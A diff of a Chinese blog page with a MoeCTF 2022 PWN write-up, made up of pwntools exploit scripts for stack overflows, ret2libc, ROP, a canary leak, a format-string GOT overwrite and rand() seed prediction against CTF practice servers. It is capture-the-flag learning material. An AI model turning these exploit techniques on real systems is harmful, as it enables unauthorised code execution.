@@ -206,7 +206,7 @@
   <div class="info" style="font-size: 0.95rem; color: #555;">
     <span class="date">
       <span class="icon"><i class="fa-solid fa-calendar fa-fw"></i></span>
-      2023/10/13
+      2023/8/16
     </span>
     
     <span class="category" style="margin-left: 1rem;">
@@ -223,7 +223,7 @@
       
       <span class="tag">
         
-        <a href="/tags/PWN/" style="color: #00bcd4; margin-right: 0.5rem;">PWN</a>
+        <a href="/tags/PWN/" style="color: #03a9f4; margin-right: 0.5rem;">PWN</a>
       </span>
       
     </span>
@@ -241,26 +241,46 @@
           <p>[MoeCTF 2022] PWN复现</p>
 <span id="more"></span>
 
-<h2 id="ret2text"><span id="ret2text">ret2text</span></h2><p>发生了明显的溢出，并且也发现了有后面函数，可以直接溢出，exp 如下：</p>
+<h2 id="ret2text"><span id="ret2text">ret2text</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
+<p>发生了明显的溢出，并且也发现了有后面函数，可以直接溢出，exp 如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28287</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4014BA</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="ret2libc"><span id="ret2libc">ret2libc</span></h2><p>利用 <code>puts</code> 泄露 libc：</p>
+<h2 id="ret2libc"><span id="ret2libc">ret2libc</span></h2><p>很传统的经典题型，利用puts泄露libc</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28546</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x4011A8</span></span><br><span class="line">rdi_addr = <span class="number">0x40117e</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr:&#x27;</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="rop32"><span id="rop32">rop32</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28903</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = <span class="number">0x804C024</span></span><br><span class="line">sys_addr = <span class="number">0x80491E7</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x1c</span> + <span class="number">4</span>) + p32(sys_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="rop32"><span id="rop32">rop32</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
+<p> 因为这里可以直接call system,并且还有binsh,直接构造就完事了，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28903</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = <span class="number">0x804C024</span></span><br><span class="line">sys_addr = <span class="number">0x80491E7</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x1c</span> + <span class="number">4</span>) + p32(sys_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="rop64"><span id="rop64">rop64</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node1.anna.nssctf.cn&quot;</span>, <span class="number">28912</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;Go Go Go!!!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4011de</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">system = <span class="number">0x401284</span></span><br><span class="line">binsh = <span class="number">0x404058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="rop64"><span id="rop64">rop64</span></h2><p>因为保护机制开启了canary，所以首先要绕过，才好开展后续工作</p>
+<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p> 这里可以直接泄露canary的地址，并且canary &#x3D;0x28,后续就是经典的套路了 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node1.anna.nssctf.cn&quot;</span>, <span class="number">28912</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;Go Go Go!!!\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">rdi_addr = <span class="number">0x4011de</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">system = <span class="number">0x401284</span></span><br><span class="line">binsh = <span class="number">0x404058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(rdi_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="filedes"><span id="filedes">filedes</span></h2><p>涉及文件的标准输出流处理。略。</p>
-<h2 id="endian"><span id="endian">endian</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28598</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x616b694d</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">payload = <span class="number">0x424e6f74</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="filedes"><span id="filedes">filedes</span></h2><p>这题的知识点比较偏吧，文件的标准输出流</p>
+<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
+<h2 id="endian"><span id="endian">endian</span></h2><p>这题因为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E6%B1%87%E7%BC%96&spm=1001.2101.3001.7020">反汇编</a>里面说了需要输入两个整数，再加上小端序的缘故，所以要倒过来，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.anna.nssctf.cn&#x27;</span>, <span class="number">28598</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x616b694d</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">payload = <span class="number">0x424e6f74</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="border"><span id="border">border</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>, <span class="number">28780</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;length:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;32&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="border"><span id="border">border</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
+<p> 再加上，要输出溢出的长度，求出两间的距离</p>
+<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/7.png"></p>
+<p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/8.png"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>, <span class="number">28780</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;length:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;32&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="buffer-overflow"><span id="buffer-overflow">buffer overflow</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28309</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Write down your note:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">70</span> + <span class="string">b&#x27;Limiter and Wings are beautiful girls!\x00&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="buffer-overflow"><span id="buffer-overflow">buffer overflow</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/9.png"></p>
+<p> 需要点逆向的能力，看代码，可知</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28309</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Write down your note:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">70</span> + <span class="string">b&#x27;Limiter and Wings are beautiful girls!\x00&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="babyfmt"><span id="babyfmt">babyfmt</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28931</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%10$s&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;printf_got: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="babyfmt"><span id="babyfmt">babyfmt</span></h2><p><img src="/images/%5BMoeCTF2022%5DPWN%E5%A4%8D%E7%8E%B0/10.png"></p>
+<p> 已经告诉了后面函数，但是发生了格式<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>漏洞，可以通过运行程序找到偏移，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="number">28931</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%10$s&quot;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">11</span>, &#123;printf_got: backdoor&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="random"><span id="random">random</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="number">28497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">p.sendafter(<span class="string">&quot;username: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;password: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">seed = u64(p.recvline(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line"></span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v8 = libc.rand()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me the number you guess now.\n&quot;</span>, <span class="built_in">str</span>(v8))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="random"><span id="random">random</span></h2><p>这题就是随机数，时间做种子，来解决，这里我有点不明白接收一下 b&#39;a&#39;*0x20，没有看明白</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node2.anna.nssctf.cn&quot;</span>, <span class="number">28497</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">p.sendafter(<span class="string">&quot;username: &quot;</span>, payload)</span><br><span class="line">payload = <span class="string">b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?\x00&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;password: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>)</span><br><span class="line">seed = u64(p.recvline(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(seed)</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">v4 = libc.rand() ^ v3</span><br><span class="line">v5 = libc.rand()</span><br><span class="line"></span><br><span class="line">libc.srand(v4 ^ v5)</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">libc.rand()</span><br><span class="line">v8 = libc.rand()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please tell me the number you guess now.\n&quot;</span>, <span class="built_in">str</span>(v8))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
         </div>
       
     </div>
@@ -358,19 +378,19 @@
 <div class="post-nav-outer" style="max-width: 1200px; margin: 3rem auto 0; display: flex; justify-content: center;">
   <div class="post-nav-inner" style="flex: 3; display: flex; gap: 1rem;">
     
-      <a href="/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="flex: 1; text-decoration: none; color: #ccc;">
+      <a href="/%5BHNCTF%202022%20Week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/" style="flex: 1; text-decoration: none; color: #ccc;">
         <div>
           <div style="font-size: 0.85rem; color: #492630;">⬅ 上一篇</div>
-          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">2024年度总结：保持正念 延迟满足</div>
+          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[HNCTF 2022 Week1] PWN 复现</div>
           <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2024-12-31
+            <i class="fa fa-calendar"></i> 2023-08-18
             
               &nbsp;| <i class="fa fa-folder-open"></i> 
             
             
               &nbsp;| <i class="fa fa-tags"></i>
               
-                奋进
+                PWN
               
             
           </div>
@@ -385,7 +405,7 @@
           <div style="font-size: 0.85rem; color: #492630;"> 本篇 ➡</div>
           <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[MoeCTF 2022] PWN复现</div>
           <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2023-10-13
+            <i class="fa fa-calendar"></i> 2023-08-16
             
               &nbsp;| <i class="fa fa-folder-open"></i> CTF
             
@@ -568,6 +588,9 @@ document.addEventListener("DOMContentLoaded", function() {
 <!-- ✅ 鼠标点击特效 -->
 <script src="/js/click-effect.js"></script>
 
+<script src="/js/code-copy.js"></script>
+
+
 <!-- 鼠标星星特效，仅桌面端加载 -->
 <script>
   if (window.innerWidth > 768) {
@@ -730,57 +753,7 @@ document.addEventListener("DOMContentLoaded", function() {
     })();
     </script>
 
-    <script>
-    document.addEventListener("DOMContentLoaded", function () {
-    document.querySelectorAll("figure.highlight").forEach(function (block) {
-        // 尝试从 code 标签 class 中提取语言名
-        let lang = block.querySelector("code")?.className?.match(/language-(\w+)/)?.[1];
 
-        // 如果没有从 code 标签获得，尝试从 figure 的 class 中提取
-        if (!lang) {
-        const figureClasses = block.className.split(/\s+/);
-        // 去除 highlight 关键字，取剩余第一个作为语言名
-        lang = figureClasses.find(c => c !== "highlight") || "code";
-        }
-
-        // 转成小写
-        lang = lang.toLowerCase();
-
-        // 创建顶部工具栏容器
-        const toolbar = document.createElement("div");
-        toolbar.className = "custom-code-toolbar";
-
-        // 🔴🟡🟢 圆点区域
-        const dots = document.createElement("div");
-        dots.className = "custom-code-dots";
-        dots.innerHTML = `<span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>`;
-        toolbar.appendChild(dots);
-
-        // 🧩 语言名标签
-        const langLabel = document.createElement("span");
-        langLabel.className = "code-lang-label";
-        langLabel.innerText = lang;
-        toolbar.appendChild(langLabel);
-
-        // 📋 复制按钮
-        const copyBtn = document.createElement("button");
-        copyBtn.className = "copy-btn";
-        copyBtn.innerText = "📋";
-        copyBtn.addEventListener("click", () => {
-        const code = block.querySelector("code");
-        if (!code) return;
-        navigator.clipboard.writeText(code.innerText).then(() => {
-            copyBtn.innerText = "✅";
-            setTimeout(() => (copyBtn.innerText = "📋"), 1500);
-        });
-        });
-        toolbar.appendChild(copyBtn);
-
-        // 插入工具栏到代码块顶部
-        block.insertBefore(toolbar, block.firstChild);
-    });
-    });
-    </script>
 
 
 
